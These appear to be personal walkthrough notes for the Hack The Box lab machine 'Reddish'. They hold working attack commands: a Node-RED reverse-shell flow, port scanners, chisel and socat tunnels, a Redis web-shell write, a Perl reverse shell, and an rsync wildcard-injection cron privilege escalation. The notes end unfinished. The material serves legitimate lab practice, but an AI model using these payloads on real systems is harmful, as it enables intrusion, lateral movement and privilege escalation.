Using [[nmap]] we found a [[Node.js]] application running on [[port 1880]] and try view on the browser we got this:
![[Pasted image 20250418040045.png]]

If `Cannot GET /` maybe trying with `POST` method we catch something.

```bash
curl -s -X POST http://10.10.10.94:1880 | jq
```

> [[jq]] is for parse the [[json]] output.

and we have a response

![[Pasted image 20250418040315.png]]
follow the path field we navigate to `http://10.10.10.94:1880/red/4f13544b17f787be7f0af27a35fb8d91`

![[Pasted image 20250418040555.png]]
and get a [[Node Red]] web.

We can found a reverse shell for `Node red` searching on the web.

```json
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"<ATTACKER_IP>","port":"<ATTACKER_PORT>","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
```

With this we gain access to `Nodered machine`

Once inside we are `root` and we have access to those subred: `172.19.0.3` `172.18.0.2`
![[Pasted image 20250418143620.png]]
let's enumerate all actives in subred `172.19.0.0/24` `172.18.0.0/24` using [[Bash scripting]]

```bash
#!/bin/bash

networks_subred=(172.18.0. 172.19.0.)

function ctrl_c() {
  echo -e "\n\t [!] Exiting."
  exit 1
}

trap ctrl_c INT

for subred in ${networks_subred[@]}; do
  for i in $(seq 0 255); do
    host=$subred$i
    timeout 1 ping -c 1 $host >/dev/null 2>&1 && echo -e "[+] HOST $host ACTIVE" &
  done
  wait
done
wait

```

we realize that the target machine does not have any terminal text editors.
then we convert the script in [[base64]] and decrypt on target machine.

```bash
base64 -w 0 scripts/host_scanner.sh | copy
```

> `-w 0` for no wrapping lines
> `copy` for send the output to clipboard

on `target machine`:
```bash
echo IyEvYmluL2Jhc2gKCm5ldHdvcmtzX3N1YnJlZD0oMTcyLjE4LjAuIDE3Mi4xOS4wLikKCmZ1bmN0aW9uIGN0cmxfYygpIHsKICBlY2hvIC1lICJcblx0IFshXSBFeGl0aW5nLiIKICBleGl0IDEKfQoKdHJhcCBjdHJsX2MgSU5UCgpmb3Igc3VicmVkIGluICR7bmV0d29ya3Nfc3VicmVkW0BdfTsgZG8KICBmb3IgaSBpbiAkKHNlcSAwIDI1NSk7IGRvCiAgICBob3N0PSRzdWJyZWQkaQogICAgdGltZW91dCAxIHBpbmcgLWMgMSAkaG9zdCA+L2Rldi9udWxsIDI+JjEgJiYgZWNobyAtZSAiWytdIEhPU1QgJGhvc3QgQUNUSVZFIiAmCiAgZG9uZQogIHdhaXQKZG9uZQp3YWl0Cg== | base64 -d
```

> `-d` for decrypt.

once executed the script we got this output
![[Pasted image 20250418144820.png]]
with this actives we can try get open ports with another script
```bash
#!/bin/bash

hosts=(172.18.0.2 172.18.0.1 172.19.0.4 172.19.0.2 172.19.0.3 172.19.0.1)

function ctrl_c() {
  echo -e "\n\t [!] Exiting."
  tput cnorm
  exit 1
}

trap ctrl_c INT

tput civis
for host in ${hosts[@]}; do
  echo -ne "\n[*] $host : "
  for port in $(seq 1 7000); do
    timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" >&/dev/null 2>&1 && echo -ne "$port " &
  done
  wait
done
wait
tput cnorm
```

Use `base64` to send to victim machine.
at executed we got:
![[Pasted image 20250418145508.png]]
first, `172.19.0.4` have a [[port 80]], means a web page.

we need one way to get access to [[port 80]] and [[port 6379]]. With [[chisel]] we can do that.

one step is transfer chisel to victim machine, but we not have curl allowed. We going to use the function [[__curl()]] implemented in bash for this
```bash
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```
This function allows us to perform HTTP request.
and with [[Python]] use simple HTTP server to serve [[chisel]]

```python
python -m http.server 8080
```
![[Pasted image 20250418161105.png]]

To check if `chisel` are transferred correctly we use [[md5sum]] firm and compare in victim machine.

```bash
echo 3fab7e53aad03a4e33166a99a7e4a630 == $(md5sum ./chisel | awk '{print $1}') && echo -e "\n\t[+] Correct.\n"
```

if `[+] Correct.` is printed `chisel`is transferred correctly.

then we need create a tunnel for can access to port 80 and 6379.
fist going to create a chisel server on our host machine:

```bash
sudo ./tools/chisel server --reverse -p 1234
```

now, in the victim machine create a `chisel` client:

```bash
./chisel client 10.10.16.2:1234 R:80:172.19.0.4:80 R:6379:172.19.0.2:6379
```

and we receive two tunnels:
![[Pasted image 20250418162509.png]]
then can check page on port 80 of our localhost
![[Pasted image 20250418162558.png]]
indeed, it works.
checking the source code (`ctrl + u`) we got:
![[Pasted image 20250418162652.png]]
three functions, one for get count of "hits" and another one for increase that "hits". lets try with `8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits` endpoint.
if you got a error 
```
MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.`
```

we can solve 

```bash
redis-cli -h localhost config set stop-writes-on-bgsave-error no
```

if no get that error maybe this:

![[Pasted image 20250418163445.png]]
let's keep in mind the path `/var/www/html/8924d0549008565c554f8128cd11fda4/` if we have a method to create a web reverse shell that path may be useful.
Searching on the browser found a way to implement a RCE in [[Redis]].
with the next script can be automatized: 

```bash
cat ~/Desktop/hackthebox/Reddish/shells/web-shell.php | redis-cli -h localhost -x set r
redis-cli -h localhost config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
redis-cli -h localhost config set dbfilename "r.php"
redis-cli -h localhost save

```
Ensure `web-shell.php` exists and keep in mind at moment to send the shell the process can add garbage at the beginning and end of file. so use `\n\n\n` at beginning and the end.
![[Pasted image 20250418164303.png]]
at execute the script and we have four `OK` it's done. Go the path
`http://localhost/8924d0549008565c554f8128cd11fda4/r.php?cmd=%27whoami%27`
and works
![[Pasted image 20250418164652.png]]
if we can check connectivity with our machine with `ping`. Get this message: `ping: icmp open socket: Operation not permitted`.
But the machine have connectivity with `Nodered - 172.19.0.3` we try establish a tunnel with [[socat]] in a port of that machine and redirect the traffic to our host device.
First transfer `socat` in the same way as transfer `chisel`.
Now we need start a listener on the victim port to work as traffic redirect.

```bash
./socat TCP-LISTEN:1111,fork TCP:10.10.16.2:9003 &
```

with this we run socat in the background to start `chisel` again.
now, check if the web shell has [[Perl]] to establish a reverse shell to `Nodered` and that redirect to our `port 9003`.

> Remember execute the script to send a `web-shell.php` to `redis` service.

now, lets try with perl reverse shell.
```bash
perl -e 'use Socket;$i="172.19.0.3";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S");open(STDOUT,">%26S");open(STDERR,">%26S");exec("/bin/sh -i");};'
```
We aim to `Nodered` machine on port 1111.
In our host machine listen at port 9003

```bash
nc -nlvp 9003
```
And if all works, we receive a connection.
![[Pasted image 20250418170949.png]]
now we are in `172.19.0.4` 
![[Pasted image 20250418171613.png]]
but found another host. `172.20.0.3`

If we search in `/etc/cron.d` folder we find a [[cron]] task active.
![[Pasted image 20250418172122.png]]
backup.sh:
```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```
basically, `cron` task send all all files with `.rdb` extension to [[rsync]] server.
We can approach the [[Wildcards|Wildcard]] `*` search `rsync` in `GTFObins` https://gtfobins.github.io/gtfobins/rsync/#shell we found a way to get a shell with.

![[Pasted image 20250418173633.png]]
basically:
```bash
rsync -e 'sh -c "command_to_execute"' 127.0.0.1:/dev/null
```

so let's try [[setuid]] to `/bin/bash`
first create a little script realize that for us

```bash
#!/bin/bash
chmod 4755 /bin/bash
```
send to folder with [[base64]]

and create the file that execute that
```bash
touch -- '-e sh s.rdb'
```

so
```bash
touch -- '-e sh s.rdb' && echo IyEvYmluL2Jhc2gKCmNobW9kIDQ3NTUgL2Jpbi9iYXNoCg== | base64 -d > s.rdb
```

and with `bash -p` we're `root`. now we have allowed use `ping`
trying send `icmp` packet to backup rsync server got this:
![[Pasted image 20250418180308.png]]
that is another host different of founded before but are in the same segment.

Now, we can look up the `backup` [[rsync]] server.

```bash
rsync rsync://172.20.0.2
```

((((( vulnerable with cron tasks )))))

blah blah killer instinct

check mounts [[df]]